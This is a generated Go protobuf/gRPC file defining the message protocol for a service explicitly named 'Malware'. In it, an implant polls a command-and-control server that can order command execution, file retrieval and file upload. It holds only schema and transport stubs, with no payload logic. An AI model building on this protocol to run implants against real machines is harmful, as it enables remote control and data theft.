// Code generated by protoc-gen-go. DO NOT EDIT.
// source: common/messages/messages.proto

package messages

import (
	context "context"
	fmt "fmt"
	proto "github.com/golang/protobuf/proto"
	grpc "google.golang.org/grpc"
	codes "google.golang.org/grpc/codes"
	status "google.golang.org/grpc/status"
	math "math"
)

// Reference imports to suppress errors if they are not otherwise used.
var _ = proto.Marshal
var _ = fmt.Errorf
var _ = math.Inf

// This is a compile-time assertion to ensure that this generated file
// is compatible with the proto package it is being compiled against.
// A compilation error at this line likely means your copy of the
// proto package needs to be updated.
const _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package

type ImplantReply struct {
	Module               string   `protobuf:"bytes,1,opt,name=module,proto3" json:"module,omitempty"`
	Args                 []byte   `protobuf:"bytes,2,opt,name=args,proto3" json:"args,omitempty"`
	XXX_NoUnkeyedLiteral struct{} `json:"-"`
	XXX_unrecognized     []byte   `json:"-"`
	XXX_sizecache        int32    `json:"-"`
}

func (m *ImplantReply) Reset()         { *m = ImplantReply{} }
func (m *ImplantReply) String() string { return proto.CompactTextString(m) }
func (*ImplantReply) ProtoMessage()    {}
func (*ImplantReply) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{0}
}

func (m *ImplantReply) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_ImplantReply.Unmarshal(m, b)
}
func (m *ImplantReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_ImplantReply.Marshal(b, m, deterministic)
}
func (m *ImplantReply) XXX_Merge(src proto.Message) {
	xxx_messageInfo_ImplantReply.Merge(m, src)
}
func (m *ImplantReply) XXX_Size() int {
	return xxx_messageInfo_ImplantReply.Size(m)
}
func (m *ImplantReply) XXX_DiscardUnknown() {
	xxx_messageInfo_ImplantReply.DiscardUnknown(m)
}

var xxx_messageInfo_ImplantReply proto.InternalMessageInfo

func (m *ImplantReply) GetModule() string {
	if m != nil {
		return m.Module
	}
	return ""
}

func (m *ImplantReply) GetArgs() []byte {
	if m != nil {
		return m.Args
	}
	return nil
}

type Exec struct {
	Exec                 string   `protobuf:"bytes,1,opt,name=Exec,proto3" json:"Exec,omitempty"`
	Args                 []string `protobuf:"bytes,2,rep,name=Args,proto3" json:"Args,omitempty"`
	XXX_NoUnkeyedLiteral struct{} `json:"-"`
	XXX_unrecognized     []byte   `json:"-"`
	XXX_sizecache        int32    `json:"-"`
}

func (m *Exec) Reset()         { *m = Exec{} }
func (m *Exec) String() string { return proto.CompactTextString(m) }
func (*Exec) ProtoMessage()    {}
func (*Exec) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{1}
}

func (m *Exec) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_Exec.Unmarshal(m, b)
}
func (m *Exec) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_Exec.Marshal(b, m, deterministic)
}
func (m *Exec) XXX_Merge(src proto.Message) {
	xxx_messageInfo_Exec.Merge(m, src)
}
func (m *Exec) XXX_Size() int {
	return xxx_messageInfo_Exec.Size(m)
}
func (m *Exec) XXX_DiscardUnknown() {
	xxx_messageInfo_Exec.DiscardUnknown(m)
}

var xxx_messageInfo_Exec proto.InternalMessageInfo

func (m *Exec) GetExec() string {
	if m != nil {
		return m.Exec
	}
	return ""
}

func (m *Exec) GetArgs() []string {
	if m != nil {
		return m.Args
	}
	return nil
}

type GetFile struct {
	Filename             string   `protobuf:"bytes,1,opt,name=filename,proto3" json:"filename,omitempty"`
	XXX_NoUnkeyedLiteral struct{} `json:"-"`
	XXX_unrecognized     []byte   `json:"-"`
	XXX_sizecache        int32    `json:"-"`
}

func (m *GetFile) Reset()         { *m = GetFile{} }
func (m *GetFile) String() string { return proto.CompactTextString(m) }
func (*GetFile) ProtoMessage()    {}
func (*GetFile) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{2}
}

func (m *GetFile) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_GetFile.Unmarshal(m, b)
}
func (m *GetFile) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_GetFile.Marshal(b, m, deterministic)
}
func (m *GetFile) XXX_Merge(src proto.Message) {
	xxx_messageInfo_GetFile.Merge(m, src)
}
func (m *GetFile) XXX_Size() int {
	return xxx_messageInfo_GetFile.Size(m)
}
func (m *GetFile) XXX_DiscardUnknown() {
	xxx_messageInfo_GetFile.DiscardUnknown(m)
}

var xxx_messageInfo_GetFile proto.InternalMessageInfo

func (m *GetFile) GetFilename() string {
	if m != nil {
		return m.Filename
	}
	return ""
}

type UploadFile struct {
	Filename             string   `protobuf:"bytes,1,opt,name=filename,proto3" json:"filename,omitempty"`
	Contents             []byte   `protobuf:"bytes,2,opt,name=contents,proto3" json:"contents,omitempty"`
	XXX_NoUnkeyedLiteral struct{} `json:"-"`
	XXX_unrecognized     []byte   `json:"-"`
	XXX_sizecache        int32    `json:"-"`
}

func (m *UploadFile) Reset()         { *m = UploadFile{} }
func (m *UploadFile) String() string { return proto.CompactTextString(m) }
func (*UploadFile) ProtoMessage()    {}
func (*UploadFile) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{3}
}

func (m *UploadFile) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_UploadFile.Unmarshal(m, b)
}
func (m *UploadFile) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_UploadFile.Marshal(b, m, deterministic)
}
func (m *UploadFile) XXX_Merge(src proto.Message) {
	xxx_messageInfo_UploadFile.Merge(m, src)
}
func (m *UploadFile) XXX_Size() int {
	return xxx_messageInfo_UploadFile.Size(m)
}
func (m *UploadFile) XXX_DiscardUnknown() {
	xxx_messageInfo_UploadFile.DiscardUnknown(m)
}

var xxx_messageInfo_UploadFile proto.InternalMessageInfo

func (m *UploadFile) GetFilename() string {
	if m != nil {
		return m.Filename
	}
	return ""
}

func (m *UploadFile) GetContents() []byte {
	if m != nil {
		return m.Contents
	}
	return nil
}

// Implant -> C2
type CheckCmdRequest struct {
	// Types that are valid to be assigned to Message:
	//	*CheckCmdRequest_Heartbeat
	//	*CheckCmdRequest_Reply
	Message              isCheckCmdRequest_Message `protobuf_oneof:"message"`
	XXX_NoUnkeyedLiteral struct{}                  `json:"-"`
	XXX_unrecognized     []byte                    `json:"-"`
	XXX_sizecache        int32                     `json:"-"`
}

func (m *CheckCmdRequest) Reset()         { *m = CheckCmdRequest{} }
func (m *CheckCmdRequest) String() string { return proto.CompactTextString(m) }
func (*CheckCmdRequest) ProtoMessage()    {}
func (*CheckCmdRequest) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{4}
}

func (m *CheckCmdRequest) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_CheckCmdRequest.Unmarshal(m, b)
}
func (m *CheckCmdRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_CheckCmdRequest.Marshal(b, m, deterministic)
}
func (m *CheckCmdRequest) XXX_Merge(src proto.Message) {
	xxx_messageInfo_CheckCmdRequest.Merge(m, src)
}
func (m *CheckCmdRequest) XXX_Size() int {
	return xxx_messageInfo_CheckCmdRequest.Size(m)
}
func (m *CheckCmdRequest) XXX_DiscardUnknown() {
	xxx_messageInfo_CheckCmdRequest.DiscardUnknown(m)
}

var xxx_messageInfo_CheckCmdRequest proto.InternalMessageInfo

type isCheckCmdRequest_Message interface {
	isCheckCmdRequest_Message()
}

type CheckCmdRequest_Heartbeat struct {
	Heartbeat int64 `protobuf:"varint,1,opt,name=heartbeat,proto3,oneof"`
}

type CheckCmdRequest_Reply struct {
	Reply *ImplantReply `protobuf:"bytes,2,opt,name=reply,proto3,oneof"`
}

func (*CheckCmdRequest_Heartbeat) isCheckCmdRequest_Message() {}

func (*CheckCmdRequest_Reply) isCheckCmdRequest_Message() {}

func (m *CheckCmdRequest) GetMessage() isCheckCmdRequest_Message {
	if m != nil {
		return m.Message
	}
	return nil
}

func (m *CheckCmdRequest) GetHeartbeat() int64 {
	if x, ok := m.GetMessage().(*CheckCmdRequest_Heartbeat); ok {
		return x.Heartbeat
	}
	return 0
}

func (m *CheckCmdRequest) GetReply() *ImplantReply {
	if x, ok := m.GetMessage().(*CheckCmdRequest_Reply); ok {
		return x.Reply
	}
	return nil
}

// XXX_OneofWrappers is for the internal use of the proto package.
func (*CheckCmdRequest) XXX_OneofWrappers() []interface{} {
	return []interface{}{
		(*CheckCmdRequest_Heartbeat)(nil),
		(*CheckCmdRequest_Reply)(nil),
	}
}

// C2 -> Implant
type CheckCmdReply struct {
	// Types that are valid to be assigned to Message:
	//	*CheckCmdReply_Heartbeat
	//	*CheckCmdReply_Exec
	//	*CheckCmdReply_Getfile
	//	*CheckCmdReply_Uploadfile
	Message              isCheckCmdReply_Message `protobuf_oneof:"message"`
	XXX_NoUnkeyedLiteral struct{}                `json:"-"`
	XXX_unrecognized     []byte                  `json:"-"`
	XXX_sizecache        int32                   `json:"-"`
}

func (m *CheckCmdReply) Reset()         { *m = CheckCmdReply{} }
func (m *CheckCmdReply) String() string { return proto.CompactTextString(m) }
func (*CheckCmdReply) ProtoMessage()    {}
func (*CheckCmdReply) Descriptor() ([]byte, []int) {
	return fileDescriptor_8a23ab92aaff7b7b, []int{5}
}

func (m *CheckCmdReply) XXX_Unmarshal(b []byte) error {
	return xxx_messageInfo_CheckCmdReply.Unmarshal(m, b)
}
func (m *CheckCmdReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
	return xxx_messageInfo_CheckCmdReply.Marshal(b, m, deterministic)
}
func (m *CheckCmdReply) XXX_Merge(src proto.Message) {
	xxx_messageInfo_CheckCmdReply.Merge(m, src)
}
func (m *CheckCmdReply) XXX_Size() int {
	return xxx_messageInfo_CheckCmdReply.Size(m)
}
func (m *CheckCmdReply) XXX_DiscardUnknown() {
	xxx_messageInfo_CheckCmdReply.DiscardUnknown(m)
}

var xxx_messageInfo_CheckCmdReply proto.InternalMessageInfo

type isCheckCmdReply_Message interface {
	isCheckCmdReply_Message()
}

type CheckCmdReply_Heartbeat struct {
	Heartbeat int64 `protobuf:"varint,1,opt,name=heartbeat,proto3,oneof"`
}

type CheckCmdReply_Exec struct {
	Exec *Exec `protobuf:"bytes,2,opt,name=exec,proto3,oneof"`
}

type CheckCmdReply_Getfile struct {
	Getfile *GetFile `protobuf:"bytes,3,opt,name=getfile,proto3,oneof"`
}

type CheckCmdReply_Uploadfile struct {
	Uploadfile *UploadFile `protobuf:"bytes,4,opt,name=uploadfile,proto3,oneof"`
}

func (*CheckCmdReply_Heartbeat) isCheckCmdReply_Message() {}

func (*CheckCmdReply_Exec) isCheckCmdReply_Message() {}

func (*CheckCmdReply_Getfile) isCheckCmdReply_Message() {}

func (*CheckCmdReply_Uploadfile) isCheckCmdReply_Message() {}

func (m *CheckCmdReply) GetMessage() isCheckCmdReply_Message {
	if m != nil {
		return m.Message
	}
	return nil
}

func (m *CheckCmdReply) GetHeartbeat() int64 {
	if x, ok := m.GetMessage().(*CheckCmdReply_Heartbeat); ok {
		return x.Heartbeat
	}
	return 0
}

func (m *CheckCmdReply) GetExec() *Exec {
	if x, ok := m.GetMessage().(*CheckCmdReply_Exec); ok {
		return x.Exec
	}
	return nil
}

func (m *CheckCmdReply) GetGetfile() *GetFile {
	if x, ok := m.GetMessage().(*CheckCmdReply_Getfile); ok {
		return x.Getfile
	}
	return nil
}

func (m *CheckCmdReply) GetUploadfile() *UploadFile {
	if x, ok := m.GetMessage().(*CheckCmdReply_Uploadfile); ok {
		return x.Uploadfile
	}
	return nil
}

// XXX_OneofWrappers is for the internal use of the proto package.
func (*CheckCmdReply) XXX_OneofWrappers() []interface{} {
	return []interface{}{
		(*CheckCmdReply_Heartbeat)(nil),
		(*CheckCmdReply_Exec)(nil),
		(*CheckCmdReply_Getfile)(nil),
		(*CheckCmdReply_Uploadfile)(nil),
	}
}

func init() {
	proto.RegisterType((*ImplantReply)(nil), "messages.ImplantReply")
	proto.RegisterType((*Exec)(nil), "messages.Exec")
	proto.RegisterType((*GetFile)(nil), "messages.GetFile")
	proto.RegisterType((*UploadFile)(nil), "messages.UploadFile")
	proto.RegisterType((*CheckCmdRequest)(nil), "messages.CheckCmdRequest")
	proto.RegisterType((*CheckCmdReply)(nil), "messages.CheckCmdReply")
}

func init() { proto.RegisterFile("common/messages/messages.proto", fileDescriptor_8a23ab92aaff7b7b) }

var fileDescriptor_8a23ab92aaff7b7b = []byte{
	// 357 bytes of a gzipped FileDescriptorProto
	0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0x84, 0x92, 0xcd, 0x4e, 0xea, 0x40,
	0x14, 0xc7, 0xdb, 0x4b, 0x2f, 0x85, 0x73, 0xb9, 0xf7, 0x86, 0x89, 0x41, 0x64, 0x41, 0x48, 0xa3,
	0x09, 0x1b, 0x6b, 0x82, 0x89, 0x0b, 0x77, 0x8a, 0x1f, 0x65, 0xe1, 0xc2, 0x89, 0x3e, 0xc0, 0xd0,
	0x1e, 0x81, 0x38, 0xd3, 0xa9, 0xed, 0x34, 0xca, 0x13, 0xfa, 0x5a, 0x66, 0xa6, 0x5f, 0xc4, 0x98,
	0xb0, 0xea, 0xf9, 0xf8, 0x9f, 0xf3, 0xef, 0xf9, 0x65, 0x60, 0x1c, 0x4a, 0x21, 0x64, 0x7c, 0x26,
	0x30, 0xcb, 0xd8, 0x0a, 0xb3, 0x3a, 0xf0, 0x93, 0x54, 0x2a, 0x49, 0x3a, 0x55, 0xee, 0x5d, 0x42,
	0x6f, 0x21, 0x12, 0xce, 0x62, 0x45, 0x31, 0xe1, 0x5b, 0x32, 0x80, 0xb6, 0x90, 0x51, 0xce, 0x71,
	0x68, 0x4f, 0xec, 0x69, 0x97, 0x96, 0x19, 0x21, 0xe0, 0xb0, 0x74, 0x95, 0x0d, 0x7f, 0x4d, 0xec,
	0x69, 0x8f, 0x9a, 0xd8, 0xf3, 0xc1, 0xb9, 0xfd, 0xc0, 0x50, 0xf7, 0xf4, 0xb7, 0x9c, 0xa8, 0x6b,
	0x57, 0x85, 0xbe, 0xa5, 0x6b, 0x3a, 0xf6, 0x4e, 0xc0, 0xbd, 0x47, 0x75, 0xb7, 0xe1, 0x48, 0x46,
	0xd0, 0x79, 0xd9, 0x70, 0x8c, 0x99, 0xa8, 0x8c, 0xea, 0xdc, 0xbb, 0x01, 0x78, 0x4e, 0xb8, 0x64,
	0xd1, 0x3e, 0xa5, 0xee, 0x85, 0x32, 0x56, 0x18, 0xab, 0xea, 0xc7, 0xea, 0xdc, 0xe3, 0xf0, 0x7f,
	0xbe, 0xc6, 0xf0, 0x75, 0x2e, 0x22, 0x8a, 0x6f, 0x39, 0x66, 0x8a, 0x8c, 0xa1, 0xbb, 0x46, 0x96,
	0xaa, 0x25, 0x32, 0x65, 0x76, 0xb5, 0x02, 0x8b, 0x36, 0x25, 0xe2, 0xc3, 0xef, 0x54, 0x43, 0x30,
	0xbb, 0xfe, 0xcc, 0x06, 0x7e, 0x4d, 0x6d, 0x17, 0x51, 0x60, 0xd1, 0x42, 0x76, 0xdd, 0x05, 0xb7,
	0x54, 0x78, 0x9f, 0x36, 0xfc, 0x6d, 0xec, 0x34, 0xc8, 0x7d, 0x66, 0xc7, 0xe0, 0xa0, 0x86, 0x56,
	0x78, 0xfd, 0x6b, 0xbc, 0x34, 0xbe, 0xc0, 0xa2, 0xa6, 0x4b, 0x4e, 0xc1, 0x5d, 0xa1, 0xd2, 0x07,
	0x0f, 0x5b, 0x46, 0xd8, 0x6f, 0x84, 0x25, 0xcb, 0xc0, 0xa2, 0x95, 0x86, 0x5c, 0x00, 0xe4, 0x06,
	0x9d, 0x99, 0x70, 0xcc, 0xc4, 0x41, 0x33, 0xd1, 0x60, 0x0d, 0x2c, 0xba, 0xa3, 0xdc, 0xb9, 0x64,
	0xf6, 0x04, 0xee, 0x03, 0xe3, 0xef, 0x2c, 0x45, 0xb2, 0x80, 0x7e, 0x71, 0x93, 0x14, 0x82, 0xc5,
	0xd1, 0x63, 0x8e, 0x39, 0x92, 0xa3, 0x66, 0xdd, 0x37, 0xbe, 0xa3, 0xc3, 0x9f, 0x5a, 0x09, 0xdf,
	0x7a, 0xd6, 0xb2, 0x6d, 0xde, 0xdd, 0xf9, 0x57, 0x00, 0x00, 0x00, 0xff, 0xff, 0x4a, 0xef, 0xb2,
	0x80, 0x99, 0x02, 0x00, 0x00,
}

// Reference imports to suppress errors if they are not otherwise used.
var _ context.Context
var _ grpc.ClientConn

// This is a compile-time assertion to ensure that this generated file
// is compatible with the grpc package it is being compiled against.
const _ = grpc.SupportPackageIsVersion4

// MalwareClient is the client API for Malware service.
//
// For semantics around ctx use and closing/ending streaming RPCs, please refer to https://godoc.org/google.golang.org/grpc#ClientConn.NewStream.
type MalwareClient interface {
	CheckCommandQueue(ctx context.Context, in *CheckCmdRequest, opts ...grpc.CallOption) (*CheckCmdReply, error)
}

type malwareClient struct {
	cc *grpc.ClientConn
}

func NewMalwareClient(cc *grpc.ClientConn) MalwareClient {
	return &malwareClient{cc}
}

func (c *malwareClient) CheckCommandQueue(ctx context.Context, in *CheckCmdRequest, opts ...grpc.CallOption) (*CheckCmdReply, error) {
	out := new(CheckCmdReply)
	err := c.cc.Invoke(ctx, "/messages.Malware/CheckCommandQueue", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

// MalwareServer is the server API for Malware service.
type MalwareServer interface {
	CheckCommandQueue(context.Context, *CheckCmdRequest) (*CheckCmdReply, error)
}

// UnimplementedMalwareServer can be embedded to have forward compatible implementations.
type UnimplementedMalwareServer struct {
}

func (*UnimplementedMalwareServer) CheckCommandQueue(ctx context.Context, req *CheckCmdRequest) (*CheckCmdReply, error) {
	return nil, status.Errorf(codes.Unimplemented, "method CheckCommandQueue not implemented")
}

func RegisterMalwareServer(s *grpc.Server, srv MalwareServer) {
	s.RegisterService(&_Malware_serviceDesc, srv)
}

func _Malware_CheckCommandQueue_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(CheckCmdRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(MalwareServer).CheckCommandQueue(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/messages.Malware/CheckCommandQueue",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(MalwareServer).CheckCommandQueue(ctx, req.(*CheckCmdRequest))
	}
	return interceptor(ctx, in, info, handler)
}

var _Malware_serviceDesc = grpc.ServiceDesc{
	ServiceName: "messages.Malware",
	HandlerType: (*MalwareServer)(nil),
	Methods: []grpc.MethodDesc{
		{
			MethodName: "CheckCommandQueue",
			Handler:    _Malware_CheckCommandQueue_Handler,
		},
	},
	Streams:  []grpc.StreamDesc{},
	Metadata: "common/messages/messages.proto",
}
